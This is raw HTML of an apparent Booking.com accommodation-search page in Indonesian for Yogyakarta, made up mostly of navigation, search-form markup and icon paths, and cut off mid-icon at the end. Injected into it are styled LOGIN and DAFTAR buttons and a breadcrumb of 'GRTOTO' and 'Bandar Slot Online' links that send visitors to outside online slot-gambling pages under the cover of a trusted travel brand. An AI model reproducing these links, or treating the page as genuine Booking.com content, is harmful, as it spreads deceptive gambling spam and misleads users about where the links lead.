3 3 0 0 0 6 0M21 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0m-9-3.75a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0M6 15a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0m10.066 1.277a7.5 7.5 0 0 1-3.077 2.05.75.75 0 0 0 .498 1.415 9 9 0 0 0 3.693-2.46.75.75 0 1 0-1.114-1.005m1.798-6.466c.177.922.183 1.869.015 2.792a.75.75 0 1 0 1.476.268c.2-1.106.194-2.24-.019-3.344a.75.75 0 1 0-1.472.284m-5.337-5.784a7.5 7.5 0 0 1 3.54 2.196.75.75 0 0 0 1.113-1.004 9 9 0 0 0-4.247-2.636.75.75 0 1 0-.406 1.444M6.434 6.223a7.5 7.5 0 0 1 3.539-2.196.75.75 0 1 0-.406-1.444A9 9 0 0 0 5.32 5.219a.75.75 0 0 0 1.114 1.004M4.636 12.69a7.6 7.6 0 0 1 0-2.878.75.75 0 1 0-1.472-.284 9.1 9.1 0 0 0 0 3.446.75.75 0 0 0 1.472-.284m4.876 5.639a7.5 7.5 0 0 1-3.035-2.005.75.75 0 0 0-1.106 1.014 9 9 0 0 0 3.641 2.405.75.75 0 1 0 .5-1.414M7.31 21.872A1.5 1.5 0 0 0 8.672 24h6.656a1.5 1.5 0 0 0 1.362-2.128l-3.314-8.217c-.361-.785-1.252-1.114-2.005-.767a1.5 1.5 0 0 0-.733.734l-3.343 8.283zm1.377.595 3.328-8.25-.015.033 3.313 8.217.015.033H8.672z"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Atraksi wisata</span></div></span></a></li><li class="ddb4fbcb64"><a id="airport_taxis" tabindex="0" href="https://ch.booking.com/c?st=VEFYSQ%3D%3D&amp;lt=TEFORElOR19QQUdF&amp;si=Q2g1aUxXTjBMWEJzWVhSbWIzSnRMV1JwYzNSeWFXSjFkR2x2YmkxamRHUVFBaHBBbjlFV2JqdjQ3UktPamFKY0IzR055a21BN25LZFFVQVIvUk9Od1V2dEtUSTJLL2JhWjNnajYrMFhwcDlpMi9pd01pUk5FUjhrYVVOZXRqMDRGSXhZQ1E9PQ%3D%3D&amp;target=aHR0cHM6Ly93d3cuYm9va2luZy5jb20vdGF4aS9pbmRleC5pZC5odG1sP3NlbGVjdGVkX2N1cnJlbmN5PUlEUiZldFN0YXRlQmxvYj1FUG9RaS1hUG1WUTIzaDV2ZlNMWlpsWi10ZHNKekptR0FxRDdXX0U5ZFNZbWVRT0o4N0ZuUE5BUV9LZWRJLVFxTCZhZHBsYXQ9d3d3LWhvdGVsLXdlYl9zaGVsbF9oZWFkZXItdGF4aS1taXNzaW5nX2NyZWF0aXZlLTRwVDdtQWdDZ0Q3QmxCQ3pVM1oxdGwmbGFiZWw9Z29nMjM1amMtMTBDQXNvYUVJMmRIVndZV2wzYVc0dGNtVnJiMjFsYm1SaGMya3RkRzkwYnkxemJHOTBMWFJsY25CbGNtTmhlV0V0YldsdUxXUmxjRzh0TVRCclNBbFlBMmhvaUFFQm1BRXp1QUVYeUFFTTJBRUQ2QUVCLUFFQmlBSUJxQUlCdUFMTnZ0M0dCc0FDQWRJQ0pEY3pNMlk0WVRVeUxUZ3pZMll0TkdZellTMDROakptTFdReFkyWmlNREV6TW1JMVp0Z0NBZUFDQVEmZGlzdHJpYnV0aW9uX2lkPTRwVDdtQWdDZ0Q3QmxCQ3pVM1oxdGwmYWlkPTM1Njk4MCZjbGllbnRfbmFtZT1iLXdlYi1zaGVsbC1iZmYmc2lkPTc2M2M0MWQyYzM4MTM5MDZmMjUyNzAxM2YxMDNiODM3" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M21.75 15.5V8a.75.75 0 0 0-1.5 0v7.5a.75.75 0 0 0 1.5 0m-16.5 0V8a.75.75 0 0 0-1.5 0v7.5a.75.75 0 0 0 1.5 0M3 8.75h3a.75.75 0 0 0 0-1.5H3a.75.75 0 0 0 0 1.5m6.75 6.75v-6a.75.75 0 0 1 1.5 0v6a.75.75 0 0 0 1.5 0v-6a2.25 2.25 0 0 0-4.5 0v6a.75.75 0 0 0 1.5 0M9 13.25h3a.75.75 0 0 0 0-1.5H9a.75.75 0 0 0 0 1.5m5.304-4.971 3 7.5a.75.75 0 0 0 1.392-.557l-3-7.5a.75.75 0 0 0-1.392.557m3-.558-3 7.5a.75.75 0 0 0 1.392.557l3-7.5a.75.75 0 0 0-1.392-.557M.75 5h22.5a.75.75 0 0 0 0-1.5H.75a.75.75 0 0 0 0 1.5m0 15h22.5a.75.75 0 0 0 0-1.5H.75a.75.75 0 0 0 0 1.5"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Taksi bandara</span></div></span></a></li><li class="ddb4fbcb64 b908223875" role="presentation"><span class="a297f43545"><button aria-expanded="false" class="f63e3c83f3" type="button">Lainnya<span class="fc70cba028 b1bcc387ce ca6ff50764 c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M12 20.09a1.24 1.24 0 0 1-.88-.36L6 14.61a.75.75 0 1 1 1.06-1.06L12 18.49l4.94-4.94A.75.75 0 0 1 18 14.61l-5.12 5.12a1.24 1.24 0 0 1-.88.36m6-9.46a.75.75 0 0 0 0-1.06l-5.12-5.11a1.24 1.24 0 0 0-1.754-.006l-.006.006L6 9.57a.75.75 0 0 0 0 1.06.74.74 0 0 0 1.06 0L12 5.7l4.94 4.93a.73.73 0 0 0 .53.22c.2 0 .39-.078.53-.22"></path></svg></span></button></span></li></ul>
</div>
</nav>
</div>
</header>
</div>
</div>
</div>
<div data-bui-theme="traveller-light">
<div>
<div data-capla-component-boundary="b-property-web-property-page/SearchBoxDesktop"><div class="a193cf1ed6"><div class="adaeede2f1"><form class="" action="https://www.booking.com/searchresults.id.html" method="GET" target="_blank" role="region" aria-label="Cari akomodasi"><div data-testid="searchbox-layout-wide" class="b7ef425131 e9f1adff2b b935cde1f7 b59e36af6b"><div class="b769347817"><div class="e131f34780"><div class="a006cb595b fed761de90" data-testid="destination-container"><div class="b99b6ef58f a10a015434 d1e49ad95b ba31039024"><div class="b6f682f7ac"><div class="be34ebee1c"><div class="a7a8da5a1c b6f36b4360"><span class="fc70cba028 c2a70a5db2 bc7d708ceb" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M2.75 12h18.5c.69 0 1.25.56 1.25 1.25V18l.75-.75H.75l.75.75v-4.75c0-.69.56-1.25 1.25-1.25m0-1.5A2.75 2.75 0 0 0 0 13.25V18c0 .414.336.75.75.75h22.5A.75.75 0 0 0 24 18v-4.75a2.75 2.75 0 0 0-2.75-2.75zM0 18v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 0 18m22.5 0v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0m-.75-6.75V4.5a2.25 2.25 0 0 0-2.25-2.25h-15A2.25 2.25 0 0 0 2.25 4.5v6.75a.75.75 0 0 0 1.5 0V4.5a.75.75 0 0 1 .75-.75h15a.75.75 0 0 1 .75.75v6.75a.75.75 0 0 0 1.5 0m-13.25-3h7a.25.25 0 0 1 .25.25v2.75l.75-.75h-9l.75.75V8.5a.25.25 0 0 1 .25-.25m0-1.5A1.75 1.75 0 0 0 6.75 8.5v2.75c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75V8.5a1.75 1.75 0 0 0-1.75-1.75z"></path></svg></span></div><input name="ss" class="b915b8dc0b" placeholder="Mau pergi ke mana?" data-destination="1" autoComplete="off" aria-autocomplete="list" aria-controls="autocomplete-results" aria-haspopup="listbox" aria-label="Mau pergi ke mana?" aria-expanded="false" role="combobox" id=":R2id71:" value="Yogyakarta"/><div class="dc22f7995a ffcf7fff3d"></div><div class="a7a8da5a1c ea701580c8"><button type="button" class="de576f5064"><span role="img" class="fc70cba028 ca6ff50764" aria-label="Hapus"><svg viewBox="0 0 128 128" width="1em" height="1em"><path d="M69.7 64l33.1-33.2a4 4 0 0 0-5.6-5.6L64 58.3 30.8 25.2a4 4 0 1 0-5.6 5.6L58.3 64 25.2 97.2a4 4 0 1 0 5.6 5.6L64 69.7l33.2 33.1a4 4 0 0 0 5.6-5.6z"></path></svg></span></button></div></div></div></div><div class="ada790228e"></div></div></div></div><div class="b769347817"><div class="ed9f289288"><button data-testid="searchbox-dates-container" type="button" class="de576f5064 dc15842869 e84058595b f1f96fdf10 d10abb4e59"><span class="be2db1c937 bcb41e7c40"><span class="fc70cba028 e1f1de0f5d c2a70a5db2 bc7d708ceb" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M22.5 13.5v8.25a.75.75 0 0 1-.75.75H2.25a.75.75 0 0 1-.75-.75V5.25a.75.75 0 0 1 .75-.75h19.5a.75.75 0 0 1 .75.75zm1.5 0V5.25A2.25 2.25 0 0 0 21.75 3H2.25A2.25 2.25 0 0 0 0 5.25v16.5A2.25 2.25 0 0 0 2.25 24h19.5A2.25 2.25 0 0 0 24 21.75zm-23.25-3h22.5a.75.75 0 0 0 0-1.5H.75a.75.75 0 0 0 0 1.5M7.5 6V.75a.75.75 0 0 0-1.5 0V6a.75.75 0 0 0 1.5 0M18 6V.75a.75.75 0 0 0-1.5 0V6A.75.75 0 0 0 18 6M5.095 14.03a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06m.53-1.28a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m-.53 6.53a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06m.53-1.28a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m5.845-3.97a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06m.53-1.28A1.125 1.125 0 1 0 12 15a1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m-.53 6.53a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06M12 18a1.125 1.125 0 1 0 0 2.25A1.125 1.125 0 0 0 12 18a.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m5.845-3.97a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06m.53-1.28a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m-.53 6.53a.75.75 0 1 0 1.06-1.06.75.75 0 0 0-1.06 1.06m.53-1.28a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5"></path></svg></span><span data-testid="date-display-field-start">Waktu check-in</span><span class="eca9157be5"> — </span><span data-testid="date-display-field-end">Waktu check-out</span></span></button></div></div><div class="b769347817"><div class="ab2c86b370" tabindex="-1"><button data-testid="occupancy-config" aria-controls=":R6d71:" aria-expanded="false" aria-label="Jumlah traveler dan kamar. Saat ini dipilih: 2 dewasa · 0 anak · 1 kamar" type="button" class="de576f5064 dc15842869 e84058595b b3d1de1c28"><span class="be2db1c937 bcb41e7c40"><span data-testid="occupancy-config-icon" class="fc70cba028 d62168fff1 c2a70a5db2 bc7d708ceb" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M16.5 6a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0M18 6A6 6 0 1 0 6 6a6 6 0 0 0 12 0M3 23.25a9 9 0 1 1 18 0 .75.75 0 0 0 1.5 0c0-5.799-4.701-10.5-10.5-10.5S1.5 17.451 1.5 23.25a.75.75 0 0 0 1.5 0"></path></svg></span>2 dewasa · 0 anak · 1 kamar</span><span data-testid="searchbox-form-button-icon" class="fc70cba028 ac148ea56b eff0666279 ca6ff50764" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path></svg></span></button></div></div><div class="b769347817 a7e79c28d6"><button type="submit" class="de576f5064 b46cd7aad7 ced67027e5 dda427e6b5 e4f9ca4b0c ca8e0b9533 cfd71fb584 a9d40b8d51"><span class="ca2ca5203b">Cari</span></button></div></div><fieldset class="ee43d4b987" data-testid="searchbox-footer"></fieldset><input type="hidden" name="ssne" value="Yogyakarta"/><input type="hidden" name="ssne_untouched" value="Yogyakarta"/><input type="hidden" name="highlighted_hotels" value="14770538"/></form></div></div></div>
</div>
</div>
      <style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;font-weight:700}.n-columns-2 a{text-align:center;color:#fff;padding:14px 12px;border-radius:12px;text-decoration:none;position:relative;overflow:hidden;transition:transform .3s ease,box-shadow .3s ease}.n-columns-2 a:hover{transform:translateY(-4px) scale(1.03);box-shadow:0 6px 15px rgba(0,0,0,.4)}.n-columns-2 a::before{content:"";position:absolute;top:0;left:0;width:200%;height:300%;background:linear-gradient(120deg, #db3906, #000000, #db3906, #000000, #db3906);background-size:300% 100%;animation:gradientRun 4s linear infinite;z-index:0}.n-columns-2 a span{position:relative;z-index:1}@keyframes gradientRun{0%{background-position:0% 50%}100%{background-position:-200% 50%}}.login{border:2px solid #f9d423}.register{border:2px solid #db3906}</style>

          <div class="n-columns-2">
              <a href="https://c-e-o.b-cdn.net/slot.html" class="login"><span>LOGIN</span></a>

              <a href="https://c-e-o.b-cdn.net/slot.html" class="register"><span>DAFTAR</span></a>
          </div>
<div id="bodyconstraint" class="  bodyconstraint_increased-min-width   ">
<div id="bodyconstraint-inner">
<div id="subheader-wrap" class="" style="">
<div data-et-view=" IZAeOYFKMbLRCFKBdFfUDPBFO:2 IZAeOYFKMbLRCFKBdFfUDPBFO:3 "></div>

                    <div class="css-1ihqho8">
                        <nav aria-label="Breadcrumb" style="font-family:Arial, sans-serif;">
                            <ul style="list-style:none; display:flex; flex-wrap:wrap; gap:8px; padding:0; margin:0;">
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">GRTOTO</a></li>
                                <li> / </li>
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">Slot Online</a></li>
                                <li> / </li>
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">Bandar Slot</a></li>
                                <li> / </li>
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">Situs Slot</a></li>
                                <li> / </li>
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">Bandar Slot Online</a></li>
                                <li> / </li>
                                <li>
                                    <a href="https://nikoenergyltd.com/our-videos/" style="padding:6px 12px; border-radius:999px; background:#f3f4f6; color:#db3906; text-decoration:none; border:1px solid #e5e7eb;">Toto Slot</a></li>
                                <li> / </li>
                                <li style="padding:6px 12px; border-radius:999px; background:#fff; border:1px solid #e5e7eb; color:#0ba0db;">GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin</li>
                            </ul>
                        </nav>

                    </div>

<div data-block-id="header_survey">
</div>
<div data-capla-component-boundary="b-property-web-property-page/GlobalAlerts"></div>
<svg class="bk-icon -genius-new_identity-genius_badge" height="174" style="display:none;" width="434" viewBox="0 0 434 174" role="presentation" aria-hidden="true" focusable="false">
<g>
<path d="M418.964 0H14.6335C6.65829 0 0.193115 6.46518 0.193115 14.4404V158.844C0.193115 166.819 6.65829 173.285 14.6335 173.285H418.964C426.939 173.285 433.404 166.819 433.404 158.844V14.4404C433.404 6.46518 426.939 0 418.964 0Z" fill="#004CB8"/>
<path d="M375.643 112.057C375.651 112.911 375.418 113.75 374.971 114.478C374.524 115.206 373.881 115.793 373.116 116.173C371.061 117.213 368.774 117.71 366.473 117.617C363.367 117.862 360.262 117.13 357.592 115.523C355.323 114.154 353.571 112.072 352.611 109.602C352.551 109.35 352.431 109.116 352.26 108.921C352.09 108.726 351.874 108.575 351.632 108.483C351.39 108.39 351.129 108.358 350.871 108.39C350.614 108.421 350.368 108.515 350.156 108.664L341.13 112.635C340.869 112.706 340.627 112.837 340.425 113.019C340.223 113.2 340.067 113.426 339.969 113.679C339.87 113.932 339.833 114.205 339.859 114.475C339.885 114.745 339.975 115.005 340.12 115.234C342.038 119.7 345.325 123.441 349.506 125.92C354.638 128.933 360.527 130.412 366.473 130.18C372.448 130.368 378.324 128.621 383.224 125.198C385.473 123.727 387.315 121.711 388.577 119.338C389.839 116.965 390.481 114.312 390.444 111.624C390.444 101.997 383.657 96.1488 370.083 94.079C366.842 93.6288 363.696 92.6533 360.769 91.1909C358.603 90.1801 356.148 88.8082 356.148 87.2198C356.194 86.4783 356.458 85.7669 356.908 85.1757C357.358 84.5845 357.973 84.14 358.676 83.8985C360.848 83.0046 363.187 82.5861 365.535 82.6711C367.779 82.6622 370.001 83.1271 372.054 84.0353C374.107 84.9435 375.945 86.2747 377.448 87.9418C377.63 88.1318 377.849 88.283 378.09 88.3863C378.332 88.4896 378.593 88.5429 378.856 88.5429C379.119 88.5429 379.379 88.4896 379.621 88.3863C379.863 88.283 380.082 88.1318 380.264 87.9418L386.69 82.1657C386.936 82.0362 387.148 81.8492 387.307 81.6204C387.466 81.3917 387.568 81.128 387.603 80.8517C387.639 80.5754 387.607 80.2946 387.511 80.0331C387.415 79.7717 387.257 79.5373 387.051 79.3498C382.053 74.4653 375.569 71.3872 368.625 70.6026C361.681 69.8179 354.673 71.3716 348.712 75.0177C346.74 76.4007 345.146 78.2548 344.074 80.4112C343.002 82.5675 342.487 84.9577 342.574 87.3642C342.567 89.4267 343.001 91.4669 343.848 93.3475C344.695 95.2281 345.935 96.9054 347.484 98.2667C351.292 101.398 355.888 103.422 360.769 104.115C364.771 104.676 368.681 105.769 372.394 107.364C373.334 107.744 374.143 108.391 374.72 109.225C375.297 110.059 375.618 111.043 375.643 112.057Z" fill="white"/>
<path d="M282.575 107.509C282.412 110.486 282.839 113.467 283.83 116.279C284.821 119.092 286.358 121.681 288.351 123.899C290.419 125.929 292.885 127.51 295.594 128.541C298.303 129.573 301.196 130.032 304.091 129.891C306.536 129.936 308.973 129.595 311.311 128.881C313.006 128.39 314.631 127.686 316.149 126.787C317.577 125.778 318.951 124.693 320.264 123.538L321.636 126.859C321.861 127.389 322.248 127.834 322.74 128.132C323.232 128.43 323.806 128.566 324.38 128.52H333.766C334.021 128.556 334.281 128.532 334.525 128.451C334.769 128.369 334.991 128.232 335.173 128.05C335.355 127.868 335.493 127.646 335.574 127.401C335.656 127.157 335.679 126.897 335.643 126.642V73.7906C335.635 73.5591 335.579 73.3319 335.478 73.1236C335.377 72.9152 335.233 72.7303 335.056 72.5807C334.879 72.4312 334.673 72.3202 334.451 72.255C334.229 72.1898 333.996 72.1718 333.766 72.2021H321.853C321.598 72.166 321.338 72.1897 321.094 72.2712C320.849 72.3528 320.627 72.49 320.445 72.6721C320.263 72.8542 320.126 73.0761 320.044 73.3203C319.963 73.5646 319.939 73.8244 319.975 74.0794V110.18C318.697 112.152 316.942 113.768 314.871 114.879C312.801 115.99 310.484 116.559 308.134 116.534C306.791 116.632 305.442 116.423 304.191 115.922C302.94 115.422 301.82 114.644 300.914 113.646C299.138 111.504 298.235 108.771 298.387 105.993V73.7906C298.387 72.5631 297.665 71.9133 296.365 71.9133H284.596C283.297 71.9133 282.575 72.5631 282.575 73.7906V107.509Z" fill="white"/>
<path d="M253.983 54.1515C253.968 55.5821 254.25 57.0002 254.809 58.3172C255.368 59.6341 256.193 60.8214 257.232 61.8049C259.299 63.8464 262.088 64.9912 264.993 64.9912C267.899 64.9912 270.688 63.8464 272.755 61.8049C273.786 60.8145 274.606 59.6261 275.166 58.3109C275.726 56.9958 276.015 55.581 276.015 54.1515C276.015 52.722 275.726 51.3073 275.166 49.9921C274.606 48.677 273.786 47.4885 272.755 46.4981C270.688 44.4566 267.899 43.3119 264.993 43.3119C262.088 43.3119 259.299 44.4566 257.232 46.4981C256.193 47.4816 255.368 48.669 254.809 49.9859C254.25 51.3028 253.968 52.7209 253.983 54.1515Z" fill="#FEBB02"/>
<path d="M247.413 90.7576C247.576 88.0348 247.187 85.307 246.269 82.7384C245.351 80.1699 243.922 77.8137 242.07 75.8118C239.996 73.9613 237.574 72.5422 234.946 71.6373C232.318 70.7324 229.536 70.3597 226.763 70.5411C220.636 70.5809 214.743 72.897 210.229 77.0393L208.64 73.7902C208.475 73.2445 208.126 72.7731 207.652 72.4569C207.177 72.1408 206.608 71.9995 206.041 72.0573H196.366C195.066 72.0573 194.344 72.6349 194.344 73.8624V126.714C194.344 127.942 195.066 128.591 196.366 128.591H208.207C209.507 128.591 210.229 127.942 210.229 126.714V90.6132C211.612 88.8509 213.33 87.3788 215.283 86.2811C217.277 85.0359 219.574 84.3617 221.925 84.3316C228.423 84.3316 231.745 87.7973 231.745 94.8009V126.714C231.745 127.212 231.942 127.69 232.295 128.042C232.647 128.394 233.124 128.591 233.622 128.591H245.68C246.178 128.591 246.655 128.394 247.007 128.042C247.359 127.69 247.557 127.212 247.557 126.714L247.413 90.7576Z" fill="white"/>
<path d="M187.268 102.527C187.268 103.826 186.691 104.404 185.391 104.404H144.597C145.345 107.742 147.142 110.752 149.723 112.996C152.483 115.254 155.981 116.412 159.543 116.245C161.98 116.337 164.397 115.785 166.552 114.644C168.707 113.503 170.523 111.814 171.817 109.747C172.25 109.025 173.045 108.953 174.055 109.747L184.236 113.935C185.391 114.368 185.68 115.018 185.03 116.029C182.534 120.559 178.83 124.307 174.33 126.857C169.831 129.406 164.711 130.657 159.543 130.469C151.507 130.607 143.735 127.602 137.882 122.094C134.918 119.341 132.584 115.98 131.038 112.242C129.493 108.503 128.774 104.475 128.929 100.433C128.765 96.3962 129.473 92.3715 131.005 88.6333C132.538 84.8952 134.859 81.5317 137.81 78.7724C140.626 76.0576 143.952 73.9264 147.595 72.5015C151.238 71.0765 155.127 70.3858 159.037 70.4692C162.9 70.2694 166.761 70.8864 170.369 72.2798C173.977 73.6732 177.25 75.8117 179.976 78.5558C184.948 84.1113 187.541 91.3968 187.196 98.8446L187.268 102.527ZM167.702 86.6424C165.206 84.7434 162.173 83.682 159.037 83.61C155.941 83.4943 152.894 84.4084 150.373 86.2092C148.049 87.9161 146.288 90.2799 145.319 92.9962H172.539C171.782 90.3459 170.055 88.0777 167.702 86.6424Z" fill="white"/>
<path d="M122.936 116.823C122.929 117.364 122.802 117.897 122.565 118.384C122.328 118.87 121.986 119.299 121.565 119.638C112.67 126.472 101.733 130.109 90.5177 129.963C78.5996 130.454 66.9709 126.213 58.1662 118.166C49.3615 110.119 44.0949 98.9172 43.5143 87.0032C44.1137 75.0649 49.3736 63.8383 58.1632 55.7373C66.9528 47.6363 78.5702 43.3077 90.5177 43.6821C101.588 43.6164 112.362 47.2503 121.131 54.0069C121.497 54.318 121.729 54.7572 121.781 55.2344C121.822 55.481 121.804 55.7338 121.729 55.9722C121.653 56.2105 121.523 56.4278 121.348 56.6062L112.756 66.4979C112.394 66.838 111.917 67.0274 111.42 67.0274C110.924 67.0274 110.446 66.838 110.084 66.4979C104.621 61.8534 97.6885 59.2953 90.5177 59.2777C83.1063 59.1579 75.9408 61.9357 70.5467 67.0197C65.1526 72.1037 61.9558 79.0923 61.637 86.4978C61.9931 93.8334 65.223 100.734 70.6278 105.706C76.0327 110.679 83.1779 113.323 90.5177 113.068C96.4716 113.09 102.308 111.412 107.341 108.231V96.8227H93.5502C93.3104 96.833 93.071 96.7935 92.8473 96.7065C92.6236 96.6195 92.4204 96.4869 92.2506 96.3173C92.0713 96.151 91.9277 95.9501 91.8284 95.7267C91.7291 95.5033 91.6762 95.2621 91.6729 95.0176V83.4653C91.6949 82.9748 91.9012 82.5107 92.2506 82.1657C92.6133 81.8537 93.072 81.6753 93.5502 81.6603H120.698C121.184 81.6599 121.651 81.8478 122.001 82.1843C122.351 82.5209 122.557 82.9801 122.575 83.4653L122.936 116.823Z" fill="white"/>
<path d="M264.597 72.2018H258.604C258.106 72.2018 257.629 72.3995 257.276 72.7516C256.924 73.1037 256.727 73.5811 256.727 74.079V127.075C256.727 127.573 256.924 128.051 257.276 128.403C257.629 128.755 258.106 128.952 258.604 128.952H271.384C271.882 128.952 272.359 128.755 272.711 128.403C273.063 128.051 273.261 127.573 273.261 127.075V80.866C273.446 79.686 273.35 78.4789 272.98 77.3432C272.61 76.2075 271.977 75.1753 271.132 74.3307C270.287 73.4861 269.255 72.853 268.119 72.4831C266.984 72.1131 265.777 72.0167 264.597 72.2018Z" fill="white"/>
</g>
</svg>
<svg class="bk-icon -streamline-square_rating" height="128" style="display:none;" width="112" viewBox="0 0 112 128" role="presentation" aria-hidden="true" focusable="false"><path d="M96 8H16A16 16 0 0 0 0 24v96h96a16 16 0 0 0 16-16V24A16 16 0 0 0 96 8zM56 88a24 24 0 1 1 24-24 24 24 0 0 1-24 24z"/></svg>
<svg class="bk-icon -streamline-circle" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M24 12c0 6.627-5.373 12-12 12S0 18.627 0 12 5.373 0 12 0s12 5.373 12 12z"/></svg>
<svg class="bk-icon -streamline-circle_half" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 0C28.654 0 0 28.654 0 64c0 35.346 28.654 64 64 64 35.346 0 64-28.654 64-64 0-35.346-28.654-64-64-64zm0 120V8c30.928 0 56 25.072 56 56s-25.072 56-56 56z"/></svg>
<svg class="bk-icon -streamline-star" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M23.555 8.729a1.505 1.505 0 0 0-1.406-.98h-6.087a.5.5 0 0 1-.472-.334l-2.185-6.193a1.5 1.5 0 0 0-2.81 0l-.005.016-2.18 6.177a.5.5 0 0 1-.471.334H1.85A1.5 1.5 0 0 0 .887 10.4l5.184 4.3a.5.5 0 0 1 .155.543l-2.178 6.531a1.5 1.5 0 0 0 2.31 1.684l5.346-3.92a.5.5 0 0 1 .591 0l5.344 3.919a1.5 1.5 0 0 0 2.312-1.683l-2.178-6.535a.5.5 0 0 1 .155-.543l5.194-4.306a1.5 1.5 0 0 0 .433-1.661z"/></svg>
<svg class="bk-icon -streamline-star_half" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M126.76 45.92a11.75 11.75 0 0 0-10.93-7.6H85.77L74.93 7.58A11.67 11.67 0 0 0 64 0h-.82c-.23 0-.45 0-.68.07-.23.07-.28 0-.42.06l-.72.15L61 .4c-.36.1-.71.21-1.07.34a11.65 11.65 0 0 0-6.83 6.84L42.25 38.31H12.18a11.67 11.67 0 0 0-11.13 8.18A11.39 11.39 0 0 0 .52 50a11.65 11.65 0 0 0 4.19 9l25.71 21.24-10.81 32.41c-2.024 6.113 1.282 12.711 7.39 14.75.4.13.81.23 1.21.32l.31.06c.39.082.783.139 1.18.17h1.59c.388-.017.776-.054 1.16-.11h.06a9.704 9.704 0 0 0 1.18-.26l.31-.08c.383-.114.76-.247 1.13-.4q.55-.24 1.11-.54l.26-.15c.365-.208.719-.435 1.06-.68L64 106.35l26.43 19.38a11.563 11.563 0 0 0 6.88 2.27c.596.001 1.19-.042 1.78-.13 6.367-.967 10.744-6.911 9.778-13.278-.1-.659-.257-1.309-.468-1.942L97.59 80.22l25.8-21.39a11.7 11.7 0 0 0 3.37-12.91zm-8.52 6.79l-26.52 22a6.59 6.59 0 0 0-2 7.11l11.12 33.37a3.66 3.66 0 0 1-2.95 4.81 3.578 3.578 0 0 1-2.72-.68l-27.29-20-.14-.08a6.781 6.781 0 0 0-.76-.47c-.16-.08-.33-.14-.49-.21-.16-.07-.3-.13-.46-.18-.16-.05-.39-.1-.58-.15L64.06 8a3.61 3.61 0 0 1 3.35 2.3l11.15 31.63a6.58 6.58 0 0 0 6.19 4.38h31.07a3.7 3.7 0 0 1 